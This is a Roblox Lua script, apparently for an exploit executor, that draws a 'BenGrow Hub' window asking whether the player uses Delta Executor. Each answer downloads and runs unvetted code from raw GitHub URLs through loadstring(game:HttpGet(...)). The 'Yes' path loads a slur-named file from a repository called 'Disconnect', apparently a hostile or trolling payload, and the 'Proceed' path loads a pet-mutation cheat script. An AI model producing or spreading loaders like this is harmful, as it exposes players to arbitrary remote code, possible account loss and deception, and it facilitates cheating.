-- Services
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- Cleanup
local GUI_NAME = "BenGrowHub"
if PlayerGui:FindFirstChild(GUI_NAME) then
	PlayerGui[GUI_NAME]:Destroy()
end

-- GUI Setup
local screenGui = Instance.new("ScreenGui", PlayerGui)
screenGui.Name = GUI_NAME
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 360, 0, 220)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
mainFrame.Active = true
mainFrame.Draggable = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", mainFrame).Color = Color3.fromRGB(0, 255, 130)

-- Title
local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, -20, 0, 30)
title.Position = UDim2.new(0.5, 0, 0, 10)
title.AnchorPoint = Vector2.new(0.5, 0)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(170, 255, 170)
title.Text = "üåø BenGrow Hub"

-- Warning Label
local warningLabel = Instance.new("TextLabel", mainFrame)
warningLabel.Size = UDim2.new(0.9, 0, 0, 40)
warningLabel.Position = UDim2.new(0.5, 0, 0, 45)
warningLabel.AnchorPoint = Vector2.new(0.5, 0)
warningLabel.BackgroundTransparency = 1
warningLabel.Font = Enum.Font.GothamBold
warningLabel.TextSize = 15
warningLabel.TextColor3 = Color3.fromRGB(255, 180, 180)
warningLabel.TextWrapped = true
warningLabel.Text = "‚ö†Ô∏è Warning: If you are using Delta Executor, your account might be banned."

-- Question Label
local questionLabel = Instance.new("TextLabel", mainFrame)
questionLabel.Size = UDim2.new(0.9, 0, 0, 30)
questionLabel.Position = UDim2.new(0.5, 0, 0, 90)
questionLabel.AnchorPoint = Vector2.new(0.5, 0)
questionLabel.BackgroundTransparency = 1
questionLabel.Font = Enum.Font.GothamBold
questionLabel.TextSize = 16
questionLabel.TextColor3 = Color3.new(1, 1, 1)
questionLabel.Text = "Are you using Delta Executor?"

-- Yes Button
local yesBtn = Instance.new("TextButton", mainFrame)
yesBtn.Size = UDim2.new(0.4, -10, 0, 36)
yesBtn.Position = UDim2.new(0.05, 0, 0, 130)
yesBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
yesBtn.Text = "Yes"
yesBtn.Font = Enum.Font.GothamBold
yesBtn.TextSize = 16
yesBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 6)

-- No Button
local noBtn = Instance.new("TextButton", mainFrame)
noBtn.Size = UDim2.new(0.4, -10, 0, 36)
noBtn.Position = UDim2.new(0.55, 10, 0, 130)
noBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 90)
noBtn.Text = "No"
noBtn.Font = Enum.Font.GothamBold
noBtn.TextSize = 16
noBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 6)

-- Confirm Frame (for "No" click)
local confirmFrame = Instance.new("Frame", mainFrame)
confirmFrame.Size = UDim2.new(1, 0, 1, 0)
confirmFrame.Position = UDim2.new(0, 0, 0, 0)
confirmFrame.BackgroundColor3 = Color3.fromRGB(30, 10, 40)
confirmFrame.Visible = false
Instance.new("UICorner", confirmFrame).CornerRadius = UDim.new(0, 10)

local confirmLabel = Instance.new("TextLabel", confirmFrame)
confirmLabel.Size = UDim2.new(0.9, 0, 0, 80)
confirmLabel.Position = UDim2.new(0.5, 0, 0, 40)
confirmLabel.AnchorPoint = Vector2.new(0.5, 0)
confirmLabel.BackgroundTransparency = 1
confirmLabel.Font = Enum.Font.GothamBold
confirmLabel.TextSize = 15
confirmLabel.TextColor3 = Color3.fromRGB(255, 220, 220)
confirmLabel.TextWrapped = true
confirmLabel.Text = "Are you sure you are not using Delta Executor?"

local proceedBtn = Instance.new("TextButton", confirmFrame)
proceedBtn.Size = UDim2.new(0.5, 0, 0, 30)
proceedBtn.Position = UDim2.new(0.5, 0, 1, -40)
proceedBtn.AnchorPoint = Vector2.new(0.5, 1)
proceedBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
proceedBtn.Text = "Proceed"
proceedBtn.Font = Enum.Font.GothamBold
proceedBtn.TextSize = 15
proceedBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", proceedBtn).CornerRadius = UDim.new(0, 6)

-- Functional Connections
yesBtn.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Kilcen/Disconnect/refs/heads/main/deltagay"))()
end)

noBtn.MouseButton1Click:Connect(function()
	confirmFrame.Visible = true
end)

proceedBtn.MouseButton1Click:Connect(function()
	screenGui:Destroy()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmaadV99/mutationvisual/refs/heads/main/petmutation"))()
end)
